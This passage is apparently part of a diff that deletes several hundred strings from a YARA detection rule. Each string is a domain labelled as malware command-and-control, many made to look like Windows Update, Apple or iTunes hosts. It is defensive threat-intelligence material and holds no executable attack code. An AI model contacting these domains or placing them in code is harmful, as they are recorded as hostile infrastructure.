-      $c2_811 = "sendmsg.jumpingcrab.com" ascii
-      $c2_812 = "senseye.ikwb.com" ascii
-      $c2_813 = "senseye.mrbonus.com" ascii
-      $c2_814 = "septdlluckysystem.jungleheart.com" ascii
-      $c2_815 = "seraphim-yurieva.justdied.com" ascii
-      $c2_816 = "serv.justdied.com" ascii
-      $c2_817 = "server1.proxydns.com" ascii
-      $c2_818 = "seyesb.acmetoy.com" ascii
-      $c2_819 = "sha.25u.com" ascii
-      $c2_820 = "sha.ikwb.com" ascii
-      $c2_821 = "shenajou.com" ascii
-      $c2_822 = "shoppingcentre.station155.com" ascii
-      $c2_823 = "shrimp.UsFfUnicef.com" ascii
-      $c2_824 = "shrimp.bdoncloud.com" ascii
-      $c2_825 = "shugiin.jkub.com" ascii
-      $c2_826 = "sindeali.com" ascii
-      $c2_827 = "singed.otzo.com" ascii
-      $c2_828 = "siteinit.info" ascii
-      $c2_829 = "sky.oldbmwy.com" ascii
-      $c2_830 = "sma.jimindaddy.com" ascii
-      $c2_831 = "smo.gadskysun.com" ascii
-      $c2_832 = "smtp.architectisusa.com" ascii
-      $c2_833 = "smtp.macforlinux.net" ascii
-      $c2_834 = "smtp230.toldweb.com" ascii
-      $c2_835 = "somthing.re26.com" ascii
-      $c2_836 = "sstday.jkub.com" ascii
-      $c2_837 = "start.usrobothome.com" ascii
-      $c2_838 = "station155.com" ascii
-      $c2_839 = "stevenlf.com" ascii
-      $c2_840 = "stone.jumpingcrab.com" ascii
-      $c2_841 = "style.u-tokyo-ac-jp.com" ascii
-      $c2_842 = "suayay.com" ascii
-      $c2_843 = "suibian2010.info" ascii
-      $c2_844 = "support1.mrface.com" ascii
-      $c2_845 = "supportus.mefound.com" ascii
-      $c2_846 = "suzukigooogle.8866.org" ascii
-      $c2_847 = "svc.dynssl.com" ascii
-      $c2_848 = "synssl.dnset.com" ascii
-      $c2_849 = "sz.thedomais.info" ascii
-      $c2_850 = "taipei.yourtrap.com" ascii
-      $c2_851 = "taipeifoodsite.ocry.com" ascii
-      $c2_852 = "tamraj.fartit.com" ascii
-      $c2_853 = "telegraph.mefound.com" ascii
-      $c2_854 = "test.usyahooapis.com" ascii
-      $c2_855 = "tfa.longmusic.com" ascii
-      $c2_856 = "tffghelth.com" ascii
-      $c2_857 = "thedomais.info" ascii
-      $c2_858 = "ticket.instanthq.com" ascii
-      $c2_859 = "ticket.jetos.com" ascii
-      $c2_860 = "ticket.serveuser.com" ascii
-      $c2_861 = "tidatacenter.shenajou.com" ascii
-      $c2_862 = "tisdatacenter.shenajou.com" ascii
-      $c2_863 = "tisupdateinfo.faqserv.com" ascii
-      $c2_864 = "tokyo-gojp.com" ascii
-      $c2_865 = "tokyofile.2waky.com" ascii
-      $c2_866 = "tomorrowforgood.com" ascii
-      $c2_867 = "tophost.dynamicdns.co.uk" ascii
-      $c2_868 = "toshste.com" ascii
-      $c2_869 = "toya.7766.org" ascii
-      $c2_870 = "transfer.lflinkup.org" ascii
-      $c2_871 = "transfer.mrbasic.com" ascii
-      $c2_872 = "transfer.vizvaz.com" ascii
-      $c2_873 = "trasul.mypicture.info" ascii
-      $c2_874 = "travelyokogawafz.fartit.com" ascii
-      $c2_875 = "trendmicroupdate.shenajou.com" ascii
-      $c2_876 = "trendsecurity.shenajou.com" ascii
-      $c2_877 = "trout.belowto.com" ascii
-      $c2_878 = "tv.goldtoyota.com" ascii
-      $c2_879 = "tw.2012yearleft.com" ascii
-      $c2_880 = "twmusic.proxydns.com" ascii
-      $c2_881 = "twpeoplemusicsite.my03.com" ascii
-      $c2_882 = "twtravelinfomation.toythieves.com" ascii
-      $c2_883 = "twx.mynumber.org" ascii
-      $c2_884 = "tyoto-go-jp.com" ascii
-      $c2_885 = "u-tokyo-ac-jp.com" ascii
-      $c2_886 = "u1.FartIT.com" ascii
-      $c2_887 = "u1.haoyujd.info" ascii
-      $c2_888 = "ubuntusofta.com" ascii
-      $c2_889 = "ugreen.itemdb.com" ascii
-      $c2_890 = "ui.hdcdui.com" ascii
-      $c2_891 = "uk.dynamicdns.org.uk" ascii
-      $c2_892 = "ukuoka.cloud-maste.com" ascii
-      $c2_893 = "ultimedia.vmmini.com" ascii
-      $c2_894 = "un.ddns.info" ascii
-      $c2_895 = "un.dnsrd.com" ascii
-      $c2_896 = "unhamj.com" ascii
-      $c2_897 = "update.yourtrap.com" ascii
-      $c2_898 = "updatemirrors.fartit.com" ascii
-      $c2_899 = "updates.itsaol.com" ascii
-      $c2_900 = "ups.improvejpese.com" ascii
-      $c2_901 = "urearapetsu.com" ascii
-      $c2_902 = "usa.got-game.org" ascii
-      $c2_903 = "usa.itsaol.com" ascii
-      $c2_904 = "usa.japanteam.org" ascii
-      $c2_905 = "usffunicef.com" ascii
-      $c2_906 = "usmirocomney.net" ascii
-      $c2_907 = "usrobothome.com" ascii
-      $c2_908 = "usyahooapis.com" ascii
-      $c2_909 = "uu.logon-live.com" ascii
-      $c2_910 = "uu.niushenghuo.info" ascii
-      $c2_911 = "ux.niushenghuo.info" ascii
-      $c2_912 = "v4.appledownload.ourhobby.com" ascii
-      $c2_913 = "v4.itunesmusic.jkub.com" ascii
-      $c2_914 = "v4.microsoftmusic.onedumb.com" ascii
-      $c2_915 = "v4.microsoftupdate.mrbasic.com" ascii
-      $c2_916 = "v4.windowsupdate.DEDGESUITE.NET" ascii
-      $c2_917 = "v4.windowsupdate.authorizeddns.org" ascii
-      $c2_918 = "v4.windowsupdate.dnset.com" ascii
-      $c2_919 = "v4.windowsupdate.itsaol.com" ascii
-      $c2_920 = "v4.windowsupdate.lflinkup.com" ascii
-      $c2_921 = "v4.windowsupdate.mrface.com" ascii
-      $c2_922 = "v4.windowsupdate.nsatcdns.com" ascii
-      $c2_923 = "v4.windowsupdate.x24hr.com" ascii
-      $c2_924 = "v4.windowsupdates.dnsrd.com" ascii
-      $c2_925 = "veryhuai.info" ascii
-      $c2_926 = "video.vmdnsup.org" ascii
-      $c2_927 = "vmdnsup.org" ascii
-      $c2_929 = "vmyiersend.WEBSAGO.INFO" ascii
-      $c2_930 = "vmyisan.website0012.net" ascii
-      $c2_932 = "wchildress.com" ascii
-      $c2_934 = "wcxh.mynetav.net" ascii
-      $c2_935 = "wdsupdates.com" ascii
-      $c2_936 = "webbooting.com" ascii
-      $c2_937 = "webdirectnews.dynamicdns.biz" ascii
-      $c2_938 = "webinfoseco.ygto.com" ascii
-      $c2_939 = "webmailentry.jetos.com" ascii
-      $c2_940 = "weboot.info" ascii
-      $c2_941 = "websago.info" ascii
-      $c2_942 = "websegoo.net" ascii
-      $c2_943 = "website0012.net" ascii
-      $c2_944 = "websiteboo.website0012.net" ascii
-      $c2_945 = "websqlnewsmanager.ninth.biz" ascii
-      $c2_946 = "webssl9.info" ascii
-      $c2_947 = "well.itsaol.com" ascii
-      $c2_948 = "well.mrbasic.com" ascii
-      $c2_949 = "whale.toshste.com" ascii
-      $c2_950 = "whellbuy.wschandler.com" ascii
-      $c2_951 = "whyis.haoyujd.info" ascii
-      $c2_952 = "wike.wikaba.com" ascii
-      $c2_953 = "windowfile.itemdb.com" ascii
-      $c2_954 = "windowsimages.itemdb.com" ascii
-      $c2_955 = "windowsimages.qhigh.com" ascii
-      $c2_956 = "windowsmirrors.vizvaz.com" ascii
-      $c2_957 = "windowsstores.gettrials.com" ascii
-      $c2_958 = "windowsstores.organiccrap.com" ascii
-      $c2_959 = "windowsupdate.2waky.com" ascii
-      $c2_960 = "windowsupdate.3-a.net" ascii
-      $c2_961 = "windowsupdate.acmetoy.com" ascii
-      $c2_962 = "windowsupdate.authorizeddns.net" ascii
-      $c2_963 = "windowsupdate.authorizeddns.org" ascii
-      $c2_964 = "windowsupdate.authorizeddns.us" ascii
-      $c2_965 = "windowsupdate.com.mwcname.com" ascii
-      $c2_966 = "windowsupdate.dedgesuite.net" ascii
-      $c2_967 = "windowsupdate.dns05.com" ascii
-      $c2_968 = "windowsupdate.dnset.com" ascii
-      $c2_969 = "windowsupdate.esmtp.biz" ascii
-      $c2_970 = "windowsupdate.ezua.com" ascii
-      $c2_971 = "windowsupdate.fartit.com" ascii
-      $c2_972 = "windowsupdate.gettrials.com" ascii
-      $c2_973 = "windowsupdate.instanthq.com" ascii
-      $c2_974 = "windowsupdate.itsaol.com" ascii
-      $c2_975 = "windowsupdate.jungleheart.com" ascii
-      $c2_976 = "windowsupdate.lflink.com" ascii
-      $c2_977 = "windowsupdate.mrface.com" ascii
-      $c2_978 = "windowsupdate.mylftv.com" ascii
-      $c2_979 = "windowsupdate.nsatcdns.com" ascii
-      $c2_980 = "windowsupdate.organiccrap.com" ascii
-      $c2_981 = "windowsupdate.rebatesrule.net" ascii
-      $c2_982 = "windowsupdate.sellclassics.com" ascii
-      $c2_983 = "windowsupdate.serveusers.com" ascii
-      $c2_984 = "windowsupdate.vizvaz.com" ascii
-      $c2_985 = "windowsupdate.wcwname.com" ascii
-      $c2_986 = "windowsupdate.x24hr.com" ascii
-      $c2_987 = "windowsupdate.ygto.com" ascii
-      $c2_988 = "windowsupdates.dnset.com" ascii
-      $c2_989 = "windowsupdates.ezua.com" ascii
-      $c2_990 = "windowsupdates.ikwb.com" ascii
-      $c2_991 = "windowsupdates.itemdb.com" ascii
-      $c2_992 = "windowsupdates.proxydns.com" ascii
-      $c2_993 = "workerisgood.com" ascii
-      $c2_994 = "woyaofanwen.com" ascii
-      $c2_995 = "wschandler.com" ascii
-      $c2_996 = "wthelpdesk.com" ascii
-      $c2_997 = "wubangtu.info" ascii
-      $c2_998 = "www-meti-go-jp.tyoto-go-jp.com" ascii
-      $c2_999 = "www.2014.zzux.com" ascii
-      $c2_1000 = "www.97sm.com" ascii
-      $c2_1001 = "www.9gowg.tech" ascii
-      $c2_1002 = "www.abdominal.faqserv.com" ascii
-      $c2_1003 = "www.additional.sexidude.com" ascii
-      $c2_1004 = "www.afc.https443.org" ascii
-      $c2_1005 = "www.androidmusicapp.onmypc.us" ascii
-      $c2_1006 = "www.announcements.toythieves.com" ascii
-      $c2_1007 = "www.anx-own-334.mrbasic.com" ascii
-      $c2_1008 = "www.apple.ikwb.com" ascii
-      $c2_1009 = "www.appledownload.ourhobby.com" ascii
-      $c2_1010 = "www.appleimages.itemdb.com" ascii
-      $c2_1011 = "www.appleimages.longmusic.com" ascii
-      $c2_1012 = "www.appleimages.organiccrap.com" ascii
-      $c2_1013 = "www.applejuice.itemdb.com" ascii
-      $c2_1014 = "www.applemirror.organiccrap.com" ascii
-      $c2_1015 = "www.applemirror.squirly.info" ascii
-      $c2_1016 = "www.applemusic.isasecret.com" ascii
-      $c2_1017 = "www.applemusic.itemdb.com" ascii
-      $c2_1018 = "www.applemusic.wikaba.com" ascii
-      $c2_1019 = "www.applemusic.xxuz.com" ascii
-      $c2_1020 = "www.applemusic.zzux.com" ascii
-      $c2_1021 = "www.appleupdate.itemdb.com" ascii
-      $c2_1022 = "www.appleupdateurl.2waky.com" ascii
-      $c2_1023 = "www.architectisusa.com" ascii
-      $c2_1024 = "www.army.xxuz.com" ascii
-      $c2_1025 = "www.art.p6p6.net" ascii
-      $c2_1026 = "www.asfzx.x24hr.com" ascii
-      $c2_1027 = "www.availab.wikaba.com" ascii
-      $c2_1028 = "www.availability.justdied.com" ascii
-      $c2_1029 = "www.babymusicsitetr.mymom.info" ascii
-      $c2_1030 = "www.back.jungleheart.com" ascii
-      $c2_1031 = "www.balance1.wikaba.com" ascii
-      $c2_1032 = "www.be.mrslove.com" ascii
-      $c2_1033 = "www.belowto.com" ascii
-      $c2_1034 = "www.billing.organiccrap.com" ascii
-      $c2_1035 = "www.blaaaaaaaaaaaa.windowsupdate.3-a.net" ascii
-      $c2_1036 = "www.brand.fartit.com" ascii
-      $c2_1037 = "www.bulletproof.squirly.info" ascii
-      $c2_1038 = "www.cabbage.iownyour.biz" ascii
-      $c2_1039 = "www.ccupdatedata.authorizeddns.net" ascii
-      $c2_1040 = "www.cdn.incloud-go.com" ascii
-      $c2_1041 = "www.center.shenajou.com" ascii
-      $c2_1042 = "www.chaindungeons.com" ascii
-      $c2_1043 = "www.cia.ezua.com" ascii
-      $c2_1044 = "www.cia.toh.info" ascii
-      $c2_1045 = "www.civilwar123.authorizeddns.org" ascii
-      $c2_1046 = "www.civilwar520.onmypc.org" ascii
-      $c2_1047 = "www.cloud-maste.com" ascii
-      $c2_1048 = "www.cnnews.mylftv.com" ascii
-      $c2_1049 = "www.commissioner.shenajou.com" ascii
-      $c2_1050 = "www.commons.onedumb.com" ascii
-      $c2_1051 = "www.contractus.qpoe.com" ascii
-      $c2_1052 = "www.corp-dnsonline.itsaol.com" ascii
-      $c2_1053 = "www.courier.jetos.com" ascii
-      $c2_1054 = "www.cress.mynetav.net" ascii
-      $c2_1055 = "www.ctdl.windowsupdate.nsatcdns.com" ascii
-      $c2_1056 = "www.ctldl.microsoftupdate.qhigh.com" ascii
-      $c2_1057 = "www.ctldl.windowsupdate.authorizeddns.us" ascii
-      $c2_1058 = "www.ctldl.windowsupdate.esmtp.biz" ascii
-      $c2_1059 = "www.ctldl.windowsupdate.mrface.com" ascii
-      $c2_1060 = "www.cwiinatonal.com" ascii
-      $c2_1061 = "www.dasoftactivemodule.toythieves.com" ascii
-      $c2_1062 = "www.dasonews.youdontcare.com" ascii
-      $c2_1063 = "www.daughter.vizvaz.com" ascii
-      $c2_1064 = "www.de.onmypc.info" ascii
-      $c2_1065 = "www.details.squirly.info" ascii
-      $c2_1066 = "www.development.shenajou.com" ascii
-      $c2_1067 = "www.devilcase.acmetoy.com" ascii
-      $c2_1068 = "www.disruptive.https443.net" ascii
-      $c2_1069 = "www.dns-hinettw.25u.com" ascii
-      $c2_1070 = "www.document.shenajou.com" ascii
-      $c2_1071 = "www.domainnow.yourtrap.com" ascii
-      $c2_1072 = "www.download.windowsupdate.nsatcdns.com" ascii
-      $c2_1073 = "www.ea.onmypc.info" ascii
-      $c2_1074 = "www.eddo.qpoe.com" ascii
-      $c2_1075 = "www.ehshiroshima.mylftv.com" ascii
-      $c2_1076 = "www.eric-averyanov.wha.la" ascii
-      $c2_1077 = "www.eu.acmetoy.com" ascii
-      $c2_1078 = "www.eu.wha.la" ascii
-      $c2_1079 = "www.express.lflinkup.com" ascii
-      $c2_1080 = "www.extraordinary.dynamic-dns.net" ascii
-      $c2_1081 = "www.f068v.site" ascii
-      $c2_1082 = "www.facefile.fartit.com" ascii
-      $c2_1083 = "www.fertile.authorizeddns.net" ascii
-      $c2_1084 = "www.file.zzux.com" ascii
-      $c2_1085 = "www.findme.epac.to" ascii
-      $c2_1086 = "www.fire.mrface.com" ascii
-      $c2_1087 = "www.firstnews.jkub.com" ascii
-      $c2_1088 = "www.fjs.wikaba.com" ascii
-      $c2_1089 = "www.foal.wchildress.com" ascii
-      $c2_1090 = "www.fr.wikaba.com" ascii
-      $c2_1091 = "www.freegamecenter.onedumb.com" ascii
-      $c2_1092 = "www.fruit.qhigh.com" ascii
-      $c2_1093 = "www.fuck.ikwb.com" ascii
-      $c2_1094 = "www.fuckmm.dns-dns.com" ascii
-      $c2_1095 = "www.fukuoka.cloud-maste.com" ascii
-      $c2_1096 = "www.g3ypf.online" ascii
-      $c2_1097 = "www.garlic.dyndns.pro" ascii
-      $c2_1098 = "www.generat.almostmy.com" ascii
-      $c2_1099 = "www.glicense.shenajou.com" ascii
-      $c2_1100 = "www.goldtoyota.com" ascii
-      $c2_1101 = "www.goodmusic.justdied.com" ascii
-      $c2_1102 = "www.gooesdataios.instanthq.com" ascii
-      $c2_1103 = "www.grammar.jkub.com" ascii
-      $c2_1104 = "www.helpus.ddns.info" ascii
-      $c2_1105 = "www.hii.qhigh.com" ascii
-      $c2_1106 = "www.hinetonlinedns.dns05.com" ascii
-      $c2_1107 = "www.incloud-go.com" ascii
-      $c2_1108 = "www.innocent-isayev.sexidude.com" ascii
-      $c2_1109 = "www.interpreter.shenajou.com" ascii
-      $c2_1110 = "www.invoices.sexxxy.biz" ascii
-      $c2_1111 = "www.iphone.vizvaz.com" ascii
-      $c2_1112 = "www.ipv4.microsoftupdate.mrbasic.com" ascii
-      $c2_1113 = "www.ipv4.windowsupdate.3-a.net" ascii
-      $c2_1114 = "www.ipv4.windowsupdate.esmtp.biz" ascii
-      $c2_1115 = "www.ipv4.windowsupdate.fartit.com" ascii
-      $c2_1116 = "www.ipv4.windowsupdate.lflink.com" ascii
-      $c2_1117 = "www.ipv4.windowsupdate.mrface.com" ascii
-      $c2_1118 = "www.ipv4.windowsupdate.mylftv.com" ascii
-      $c2_1119 = "www.ipv4.windowsupdate.nsatcdns.com" ascii
-      $c2_1120 = "www.itlans.isasecret.com" ascii
-      $c2_1121 = "www.itunesdownload.jkub.com" ascii
-      $c2_1122 = "www.itunesdownload.vizvaz.com" ascii
-      $c2_1123 = "www.itunesdownload.wikaba.com" ascii
-      $c2_1124 = "www.itunesimages.itemdb.com" ascii
-      $c2_1125 = "www.itunesimages.itsaol.com" ascii
-      $c2_1126 = "www.itunesimages.qpoe.com" ascii
-      $c2_1127 = "www.itunesmirror.fartit.com" ascii
-      $c2_1128 = "www.itunesmirror.itsaol.com" ascii
-      $c2_1129 = "www.itunesmusic.ikwb.com" ascii
-      $c2_1130 = "www.itunesmusic.jetos.com" ascii
-      $c2_1131 = "www.itunesmusic.jkub.com" ascii
-      $c2_1132 = "www.itunesmusic.zzux.com" ascii
-      $c2_1133 = "www.itunesupdate.itsaol.com" ascii
-      $c2_1134 = "www.itunesupdates.organiccrap.com" ascii
-      $c2_1135 = "www.japanenvnews.qpoe.com" ascii
-      $c2_1136 = "www.jd978.com" ascii
-      $c2_1137 = "www.jimin.jimindaddy.com" ascii
-      $c2_1138 = "www.jimin.mymom.info" ascii
-      $c2_1139 = "www.jp.serveuser.com" ascii
-      $c2_1140 = "www.jpnappstore.ourhobby.com" ascii
-      $c2_1141 = "www.jpnewslogs.sendsmtp.com" ascii
-      $c2_1142 = "www.jpnxzshopdata.authorizeddns.org" ascii
-      $c2_1143 = "www.kawasaki.cloud-maste.com" ascii
-      $c2_1144 = "www.kawasaki.unhamj.com" ascii
-      $c2_1145 = "www.key.zzux.com" ascii
-      $c2_1146 = "www.knowledge.sellclassics.com" ascii
-      $c2_1147 = "www.lan.dynssl.com" ascii
-      $c2_1148 = "www.last.p6p6.net" ascii
-      $c2_1149 = "www.latestnews.epac.to" ascii
-      $c2_1150 = "www.latestnews.organiccrap.com" ascii
-      $c2_1151 = "www.leedong.longmusic.com" ascii
-      $c2_1152 = "www.leeks.mrbonus.com" ascii
-      $c2_1153 = "www.liberty.acmetoy.com" ascii
-      $c2_1154 = "www.license.shenajou.com" ascii
-      $c2_1155 = "www.lion.wchildress.com" ascii
-      $c2_1156 = "www.loveddos.com" ascii
-      $c2_1157 = "www.macfee.mrface.com" ascii
-      $c2_1158 = "www.macforlinux.net" ascii
-      $c2_1159 = "www.maffc.mrface.com" ascii
-      $c2_1160 = "www.malware.dsmtp.com" ascii
-      $c2_1161 = "www.manager.jetos.com" ascii
-      $c2_1162 = "www.markabcinfo.dynamicdns.me.uk" ascii
-      $c2_1163 = "www.mason.vizvaz.com" ascii
-      $c2_1164 = "www.mediapath.organiccrap.com" ascii
-      $c2_1165 = "www.meiji-ac-jp.com" ascii
-      $c2_1166 = "www.messagea.emailfound.info" ascii
-      $c2_1167 = "www.microsoft.got-game.org" ascii
-      $c2_1168 = "www.microsoft.mrface.com" ascii
-      $c2_1169 = "www.microsoftempowering.sendsmtp.com" ascii
-      $c2_1170 = "www.microsoftgame.mrface.com" ascii
-      $c2_1171 = "www.microsoftgetstarted.sexidude.com" ascii
-      $c2_1172 = "www.microsoftimages.organiccrap.com" ascii
-      $c2_1173 = "www.microsoftmirror.mrbasic.com" ascii
-      $c2_1174 = "www.microsoftmusic.itemdb.com" ascii
-      $c2_1175 = "www.microsoftmusic.mrbasic.com" ascii
-      $c2_1176 = "www.microsoftqckmanager.pcanywhere.net" ascii
-      $c2_1177 = "www.microsoftupdate.mrbasic.com" ascii
-      $c2_1178 = "www.microsoftupdate.qhigh.com" ascii
-      $c2_1179 = "www.micrsoftware.dsmtp.com" ascii
-      $c2_1180 = "www.mircsoft.compress.to" ascii
-      $c2_1181 = "www.mmy.ddns.us" ascii
-      $c2_1182 = "www.mod.jetos.com" ascii
-      $c2_1183 = "www.mofa.dynamic-dns.net" ascii
-      $c2_1184 = "www.mofa.ns01.info" ascii
-      $c2_1185 = "www.moonnightthse.zyns.com" ascii
-      $c2_1186 = "www.moscowdic.trickip.org" ascii
-      $c2_1187 = "www.moscowstdsupdate.toythieves.com" ascii
-      $c2_1188 = "www.mseupdate.ourhobby.com" ascii
-      $c2_1189 = "www.msg.ezua.com" ascii
-      $c2_1190 = "www.msn.incloud-go.com" ascii
-      $c2_1191 = "www.musicfile.ikwb.com" ascii
-      $c2_1192 = "www.musicjj.zzux.com" ascii
-      $c2_1193 = "www.musicsecph.squirly.info" ascii
-      $c2_1194 = "www.mymusicbox.lflinkup.org" ascii
-      $c2_1195 = "www.mymusicbox.vizvaz.com" ascii
-      $c2_1196 = "www.myrestroomimage.isasecret.com" ascii
-      $c2_1197 = "www.mytwhomeinst.sendsmtp.com" ascii
-      $c2_1198 = "www.myurinikoreaaps.ninth.biz" ascii
-      $c2_1199 = "www.na.americanunfinished.com" ascii
-      $c2_1200 = "www.na.onmypc.org" ascii
-      $c2_1201 = "www.networkjpnzee.mynetav.org" ascii
-      $c2_1202 = "www.newcityoforward.rebatesrule.net" ascii
-      $c2_1203 = "www.newdnssec-info.4mydomain.com" ascii
-      $c2_1204 = "www.newsdata.jkub.com" ascii
-      $c2_1205 = "www.newsfile.toythieves.com" ascii
-      $c2_1206 = "www.newsroom.cleansite.info" ascii
-      $c2_1207 = "www.nlddnsinfo.https443.org" ascii
-      $c2_1208 = "www.no.authorizeddns.org" ascii
-      $c2_1209 = "www.nposnewsinfo.qhigh.com" ascii
-      $c2_1210 = "www.nsa.mefound.com" ascii
-      $c2_1211 = "www.nt.mynumber.org" ascii
-      $c2_1212 = "www.nttdata.otzo.com" ascii
-      $c2_1213 = "www.nuisance.serveusers.com" ascii
-      $c2_1214 = "www.nz.compress.to" ascii
-      $c2_1215 = "www.ol.almostmy.com" ascii
-      $c2_1216 = "www.oldbmwy.com" ascii
-      $c2_1217 = "www.onion.jkub.com" ascii
-      $c2_1218 = "www.onlinednsserver.sendsmtp.com" ascii
-      $c2_1219 = "www.oracleupdate.dns04.com" ascii
-      $c2_1220 = "www.oyster.jkub.com" ascii
-      $c2_1221 = "www.p6p6.net" ascii
-      $c2_1222 = "www.packetsdsquery.dns05.com" ascii
-      $c2_1223 = "www.pepper.sexxxy.biz" ascii
-      $c2_1224 = "www.phptecinfohelp.itemdb.com" ascii
-      $c2_1225 = "www.pickled.myddns.com" ascii
-      $c2_1226 = "www.polopurple.com" ascii
-      $c2_1227 = "www.portal.mrface.com" ascii
-      $c2_1228 = "www.portal.sendsmtp.com" ascii
-      $c2_1229 = "www.portalser.dynamic-dns.net" ascii
-      $c2_1230 = "www.praskovya-matveyeva.mefound.com" ascii
-      $c2_1231 = "www.praskovya-ulyanova.dumb1.com" ascii
-      $c2_1232 = "www.products.almostmy.com" ascii
-      $c2_1233 = "www.products.cleansite.us" ascii
-      $c2_1234 = "www.products.serveuser.com" ascii
-      $c2_1235 = "www.purchase.lflinkup.org" ascii
-      $c2_1236 = "www.rainbow.mypop3.org" ascii
-      $c2_1237 = "www.re26.com" ascii
-      $c2_1238 = "www.read.xxuz.com" ascii
-      $c2_1239 = "www.recent.dns-stuff.com" ascii
-      $c2_1240 = "www.recent.fartit.com" ascii
-      $c2_1241 = "www.redflower.isasecret.com" ascii
-      $c2_1242 = "www.referred.gr8domain.biz" ascii
-      $c2_1243 = "www.referred.yourtrap.com" ascii
-      $c2_1244 = "www.register.ourhobby.com" ascii
-      $c2_1245 = "www.registration2.instanthq.com" ascii
-      $c2_1246 = "www.registrations.4pu.com" ascii
-      $c2_1247 = "www.registrations.organiccrap.com" ascii
-      $c2_1248 = "www.remeberdata.iownyour.org" ascii
-      $c2_1249 = "www.reserveds.onedumb.com" ascii
-      $c2_1250 = "www.rethem.almostmy.com" ascii
-      $c2_1251 = "www.rg197.win" ascii
-      $c2_1252 = "www.sakai.unhamj.com" ascii
-      $c2_1253 = "www.sapporo.cloud-maste.com" ascii
-      $c2_1254 = "www.sauerkraut.sellclassics.com" ascii
-      $c2_1255 = "www.saverd.re26.com" ascii
-      $c2_1256 = "www.sbuudd.webssl9.info" ascii
-      $c2_1257 = "www.sdmsg.onmypc.org" ascii
-      $c2_1258 = "www.se.toythieves.com" ascii
-      $c2_1259 = "www.secertnews.mrbasic.com" ascii
-      $c2_1260 = "www.secnetshit.com" ascii
-      $c2_1261 = "www.secserverupdate.toh.info" ascii
-      $c2_1262 = "www.senseye.ikwb.com" ascii
-      $c2_1263 = "www.senseye.mrbonus.com" ascii
-      $c2_1264 = "www.septdlluckysystem.jungleheart.com" ascii
-      $c2_1265 = "www.seraphim-yurieva.justdied.com" ascii
-      $c2_1266 = "www.serv.justdied.com" ascii
-      $c2_1267 = "www.server1.proxydns.com" ascii
-      $c2_1268 = "www.seyesb.acmetoy.com" ascii
-      $c2_1269 = "www.showy.almostmy.com" ascii
-      $c2_1270 = "www.shugiin.jkub.com" ascii
-      $c2_1271 = "www.sindeali.com" ascii
-      $c2_1272 = "www.singed.otzo.com" ascii
-      $c2_1273 = "www.sojourner.mypicture.info" ascii
-      $c2_1274 = "www.sstday.jkub.com" ascii
-      $c2_1275 = "www.support1.mrface.com" ascii
-      $c2_1276 = "www.supportus.mefound.com" ascii
-      $c2_1277 = "www.svc.dynssl.com" ascii
-      $c2_1278 = "www.sweetheart.sexxxy.biz" ascii
-      $c2_1279 = "www.synssl.dnset.com" ascii
-      $c2_1280 = "www.tamraj.fartit.com" ascii
-      $c2_1281 = "www.telegraph.mefound.com" ascii
-      $c2_1282 = "www.tfa.longmusic.com" ascii
-      $c2_1283 = "www.thunder.wikaba.com" ascii
-      $c2_1284 = "www.ticket.instanthq.com" ascii
-      $c2_1285 = "www.ticket.serveuser.com" ascii
-      $c2_1286 = "www.tisupdateinfo.faqserv.com" ascii
-      $c2_1287 = "www.tokyofile.2waky.com" ascii
-      $c2_1288 = "www.tophost.dynamicdns.co.uk" ascii
-      $c2_1289 = "www.transfer.lflinkup.org" ascii
-      $c2_1290 = "www.transfer.mrbasic.com" ascii
-      $c2_1291 = "www.transfer.vizvaz.com" ascii
-      $c2_1292 = "www.twgovernmentinfo.acmetoy.com" ascii
-      $c2_1293 = "www.twsslpopservupro.dynssl.com" ascii
-      $c2_1294 = "www.ugreen.itemdb.com" ascii
-      $c2_1295 = "www.uk.dynamicdns.org.uk" ascii
-      $c2_1296 = "www.un.ddns.info" ascii
-      $c2_1297 = "www.un.dnsrd.com" ascii
-      $c2_1298 = "www.unhamj.com" ascii
-      $c2_1299 = "www.usa.itsaol.com" ascii
-      $c2_1300 = "www.usffunicef.com" ascii
-      $c2_1301 = "www.usliveupdateonline.ygto.com" ascii
-      $c2_1302 = "www.ut-portal-u-tokyo-ac-jp.tyoto-go-jp.com" ascii
-      $c2_1303 = "www.v4.windowsupdate.mrface.com" ascii
-      $c2_1304 = "www.v4.windowsupdate.nsatcdns.com" ascii
-      $c2_1305 = "www.vmmini.com" ascii
-      $c2_1306 = "www.wchildress.com" ascii
-      $c2_1307 = "www.webdirectnews.dynamicdns.biz" ascii
-      $c2_1308 = "www.webmailentry.jetos.com" ascii
-      $c2_1309 = "www.websqlnewsmanager.ninth.biz" ascii
-      $c2_1310 = "www.well.itsaol.com" ascii
-      $c2_1311 = "www.well.mrbasic.com" ascii
-      $c2_1312 = "www.windowfile.itemdb.com" ascii
-      $c2_1313 = "www.windowsimages.itemdb.com" ascii
-      $c2_1314 = "www.windowsimages.qhigh.com" ascii
-      $c2_1315 = "www.windowsmirrors.vizvaz.com" ascii
-      $c2_1316 = "www.windowsupdate.2waky.com" ascii
-      $c2_1317 = "www.windowsupdate.3-a.net" ascii
-      $c2_1318 = "www.windowsupdate.acmetoy.com" ascii
-      $c2_1319 = "www.windowsupdate.authorizeddns.net" ascii
-      $c2_1320 = "www.windowsupdate.authorizeddns.org" ascii
-      $c2_1321 = "www.windowsupdate.authorizeddns.us" ascii
-      $c2_1322 = "www.windowsupdate.dns05.com" ascii
-      $c2_1323 = "www.windowsupdate.dnset.com" ascii
-      $c2_1324 = "www.windowsupdate.esmtp.biz" ascii
-      $c2_1325 = "www.windowsupdate.ezua.com" ascii
-      $c2_1326 = "www.windowsupdate.fartit.com" ascii
-      $c2_1327 = "www.windowsupdate.gettrials.com" ascii
-      $c2_1328 = "www.windowsupdate.instanthq.com" ascii
-      $c2_1329 = "www.windowsupdate.itsaol.com" ascii
-      $c2_1330 = "www.windowsupdate.jungleheart.com" ascii
-      $c2_1331 = "www.windowsupdate.lflink.com" ascii
-      $c2_1332 = "www.windowsupdate.mrface.com" ascii
-      $c2_1333 = "www.windowsupdate.mylftv.com" ascii
-      $c2_1334 = "www.windowsupdate.nsatcdns.com" ascii
-      $c2_1335 = "www.windowsupdate.organiccrap.com" ascii
-      $c2_1336 = "www.windowsupdate.rebatesrule.net" ascii
-      $c2_1337 = "www.windowsupdate.sellclassics.com" ascii
-      $c2_1338 = "www.windowsupdate.serveusers.com" ascii
-      $c2_1339 = "www.windowsupdate.x24hr.com" ascii
-      $c2_1340 = "www.yahoo.incloud-go.com" ascii
-      $c2_1341 = "www.yandexr.sellclassics.com" ascii
-      $c2_1342 = "www.yeahyeahyeahs.3322.org" ascii
-      $c2_1343 = "www.yokohamajpinstaz.mrbonus.com" ascii
